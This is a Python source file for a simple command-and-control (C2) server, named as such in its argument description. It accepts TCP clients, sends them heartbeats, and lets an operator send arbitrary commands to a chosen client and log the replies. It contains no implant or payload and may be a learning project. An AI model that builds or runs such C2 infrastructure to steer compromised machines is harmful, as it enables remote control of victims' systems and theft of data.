import threading
import logging
import argparse
import socket
import itertools
import time
from concurrent.futures import ThreadPoolExecutor

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[
        logging.FileHandler("simple_output.log"),
        # logging.StreamHandler()
    ]
)

class Server:
    def __init__(self, ip, port):
        self.__commands = { "help" : (self.help, "Displays a help message, usage: help", 0),
                            "exit" : (self.exit, "Exits the server, usage: exit", 0),
                            "display" : (self.display, "Displays active clients, usage: display", 0),
                            "send" : (self.send, "Sends a command to a client, usage: send <client_id> <command>", 2),
                            "kill" : (self.kill, "Kills a client, usage: kill <client_id>", 1),
                            "info" : (self.info, "Displays information about the server, usage: info", 0) }
        self.is_running = True
        self.ip = ip
        self.port = port
        self.active_clients = {} # { client_id : (conn, client_address)}
        self.act_client_lock = threading.Lock()
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.socket.bind((self.ip, self.port))
        self.socket.listen()
        self.socket.settimeout(1.0) 
        self.client_id_counter = itertools.count(1)
        self.pool = ThreadPoolExecutor(max_workers=10)
        # should we enable here tcp keep alive? 
        
    def listen(self):
        print(f"Server listening on {self.ip}:{self.port}")
        while self.is_running:
            try:
                conn, addr = self.socket.accept()
                conn.settimeout(None)
                logging.info(f"New connection accepted in address {addr[0]}:{addr[1]}")
                next_id = next(self.client_id_counter)
                with self.act_client_lock:
                    self.active_clients[str(next_id)] = (conn, addr)
            except socket.timeout:
                continue
        
    def heartbeat(self):
        while self.is_running:
            time.sleep(5)
            # logging.debug("Cleanup routine started")
            with self.act_client_lock:
                client_ids = list(self.active_clients.keys())
                for cid in client_ids:
                    try:
                        conn = self.active_clients[cid][0]
                        conn.sendall(b'\x00')
                    except:
                        logging.info(f"Client {cid} is not here, cleaning")
                        self.active_clients.pop(cid, None)
                        conn.close()
                    
        
    def run(self):
        listen_thread = threading.Thread(target=self.listen, daemon=True)
        heartbeat_thread = threading.Thread(target=self.heartbeat, daemon=True)
        listen_thread.start()
        heartbeat_thread.start()
        while self.is_running:
            raw_cmd = input("cli> ")
            if raw_cmd:
                tokens = raw_cmd.strip().split(maxsplit=2)
                cmd, args = tokens[0], tokens[1:]
                # logging.debug(f"Received command: {cmd} with arguments: {args}")
                if cmd in self.__commands and len(args) == self.__commands[cmd][2]:
                    fun = self.__commands[cmd][0]
                    fun(*args)
                else:
                    print(f"Invalid command or incorrect number of arguments. Type 'help' for a list of commands.")
                    logging.warning(f"Invalid command or incorrect number of arguments. Type 'help' for a list of commands.")
        # Cleanup
        self.pool.shutdown(True)
        self.socket.close()
                    
    def help(self):
        for cmd, (_, desc, _) in self.__commands.items():
            print(f"{cmd}: {desc}")

    def exit(self):
        self.is_running = False
        logging.info("Exiting server...")
        
    def display(self):
        with self.act_client_lock:
            if not self.active_clients:
                print("No active clients.")
            else:
                for cid, (conn, addr) in self.active_clients.items():
                    print(f"Client ID: {cid}, Address: {addr[0]}:{addr[1]}")
        
    def send(self, client_id, command):
        def process(self, cid, conn, command):
            try:
                logging.info(f"Sending command to client {client_id}: {command}")
                conn.sendall(command.encode())
                data = conn.recv(1024)
                if data:
                    logging.info(f"Received data from client {cid}: {data.decode()}")
                # self.kill(cid) - should kill after every command?
            except (BrokenPipeError, ConnectionResetError) as e:
                logging.warning(f"Error occurred while processing client {cid}: {e}, killing client")
                self.kill(cid)
                
        with self.act_client_lock:
            if client_id in self.active_clients:
                conn = self.active_clients[client_id][0]
                self.pool.submit(process, self, client_id, conn, command)
            else:
                print("Non existing client")
                logging.warning(f"Non existing client: {client_id} cannot send command: {command}")
        
    def kill(self, client_id):
        with self.act_client_lock:
            if client_id in self.active_clients:
                conn, addr = self.active_clients.pop(client_id)
                conn.close()
                logging.info(f"Killed client {client_id} at address {addr[0]}:{addr[1]}")
            else:
                print(f"No client with ID {client_id} found.")
                logging.warning(f"No client with ID {client_id} found.")
    
    def info(self):
        print(f"Server Info:")
        print(f"  IP: {self.ip}")
        print(f"  Port: {self.port}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="C2 Server")
    parser.add_argument("--ip", type=str, default="127.0.0.1", help="IP address to bind the server")
    parser.add_argument("--port", type=int, default=12345, help="Port number to bind the server")
    args = parser.parse_args()
    server = Server(args.ip, args.port)
    server.run()
    